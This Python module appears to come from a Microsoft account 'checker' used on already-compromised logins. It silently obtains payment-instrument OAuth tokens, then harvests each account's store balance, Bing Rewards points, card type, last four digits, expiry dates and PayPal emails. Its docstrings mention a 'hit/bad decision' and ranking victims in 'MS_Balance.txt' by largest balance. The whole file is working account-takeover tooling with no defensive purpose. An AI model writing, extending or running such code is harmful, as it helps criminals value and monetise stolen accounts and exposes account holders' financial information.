"""Microsoft account extras: balance, rewards points, payment methods.

Each function takes an authenticated ``requests.Session`` (one that already
holds the live.com cookies from the login flow) and returns a small structured
result, or ``None`` on failure. Errors are swallowed — these are best-effort
captures, not part of the hit/bad decision.
"""

from __future__ import annotations

import logging
import re
import time
from typing import Optional
from urllib.parse import parse_qs, urlparse

import requests

from ..config import SETTINGS

log = logging.getLogger(__name__)

PIFD_CLIENT_ID = "000000000004773A"
PIFD_REDIRECT = "https://account.microsoft.com/auth/complete-silent-delegate-auth"
PIFD_SCOPE = "PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete"


def _pifd_token(session: requests.Session, cache: dict | None = None) -> Optional[str]:
    cache_key = "pifd"
    if cache and cache_key in cache and time.time() - cache[cache_key]["t"] < 300:
        return cache[cache_key]["v"]
    try:
        url = (
            f"https://login.live.com/oauth20_authorize.srf?client_id={PIFD_CLIENT_ID}"
            f"&response_type=token&scope={PIFD_SCOPE}"
            f"&redirect_uri={PIFD_REDIRECT}&prompt=none"
        )
        r = session.get(url, timeout=SETTINGS.request_timeout)
        token = parse_qs(urlparse(r.url).fragment).get("access_token", [None])[0]
        if token and cache is not None:
            cache[cache_key] = {"v": token, "t": time.time()}
        return token
    except requests.RequestException:
        return None


def fetch_balance(
    session: requests.Session, cache: dict | None = None,
) -> Optional[tuple[str, float, str]]:
    """Return ``(display, value, currency)`` or ``None`` if unavailable / zero.

    The numeric ``value`` makes it possible to sort the final ``MS_Balance.txt``
    by largest balance.
    """
    token = _pifd_token(session, cache)
    if not token:
        return None
    try:
        r = session.get(
            "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/"
            "paymentInstrumentsEx?status=active,removed&language=en-GB",
            headers={"Authorization": f"MSADELEGATE1.0={token}",
                     "Accept": "application/json"},
            timeout=SETTINGS.request_timeout + 5,
        )
        if r.status_code != 200:
            return None
        bal = re.search(r'"balance":(\d+\.?\d*)', r.text)
        if not bal:
            return None
        amount = bal.group(1)
        try:
            value = float(amount)
        except ValueError:
            return None
        if value <= 0:
            return None
        cur_match = re.search(r'"currency":"([A-Z]{3})"', r.text)
        currency = cur_match.group(1) if cur_match else "USD"
        return f"{amount} {currency}", value, currency
    except (requests.RequestException, ValueError):
        return None


def fetch_payment_methods(
    session: requests.Session, cache: dict | None = None,
) -> list[str]:
    token = _pifd_token(session, cache)
    if not token:
        return []
    try:
        r = session.get(
            "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/"
            "paymentInstrumentsEx?status=active,removed&language=en-GB",
            headers={"Authorization": f"MSADELEGATE1.0={token}",
                     "Accept": "application/json"},
            timeout=SETTINGS.request_timeout + 5,
        )
        if r.status_code != 200:
            return []
        out: list[str] = []
        for item in r.json() or []:
            pm = item.get("paymentMethod", {})
            family = pm.get("paymentMethodFamily")
            if family == "credit_card":
                last4 = pm.get("lastFourDigits", "????")
                exp = f"{pm.get('expiryMonth','??')}/{pm.get('expiryYear','????')}"
                out.append(f"CC {pm.get('paymentMethodType','')} *{last4} ({exp})")
            elif family == "paypal":
                out.append(f"PayPal: {pm.get('email','N/A')}")
        return out
    except (requests.RequestException, ValueError):
        return []


def fetch_rewards_points(session: requests.Session) -> Optional[tuple[str, int]]:
    """Fetch Bing Rewards points balance for a logged-in MSA."""
    try:
        headers = {
            "User-Agent": "Mozilla/5.0",
            "Accept": "*/*",
            "Pragma": "no-cache",
        }
        r = session.get("https://rewards.bing.com/", headers=headers,
                        timeout=SETTINGS.request_timeout)
        if 'action="https://rewards.bing.com/signin-oidc"' in r.text or 'id="fmHF"' in r.text:
            action_m = re.search(r'action="([^"]+)"', r.text)
            if action_m:
                data = {}
                for m in re.finditer(
                    r'<input type="hidden" name="([^"]+)" id="[^"]+" value="([^"]+)">',
                    r.text,
                ):
                    data[m.group(1)] = m.group(2)
                r = session.post(action_m.group(1), data=data, headers=headers,
                                 timeout=SETTINGS.request_timeout)
        all_matches = re.findall(r',"availablePoints":(\d+)', r.text)
        if all_matches:
            best = max(all_matches, key=int)
            if best != "0":
                return best, int(best)
    except requests.RequestException:
        pass

    # Flyout fallback
    try:
        session.get("https://www.bing.com/",
                    timeout=SETTINGS.request_timeout)
        ts = int(time.time() * 1000)
        r = session.get(
            f"https://www.bing.com/rewards/panelflyout/getuserinfo?timestamp={ts}",
            headers={"Accept": "application/json",
                     "X-Requested-With": "XMLHttpRequest"},
            timeout=SETTINGS.request_timeout,
        )
        if r.status_code == 200:
            data = r.json()
            info = data.get("userInfo") or {}
            if info.get("isRewardsUser") and info.get("balance") is not None:
                bal = int(info["balance"])
                if bal > 0:
                    return str(bal), bal
    except (requests.RequestException, ValueError):
        pass
    return None
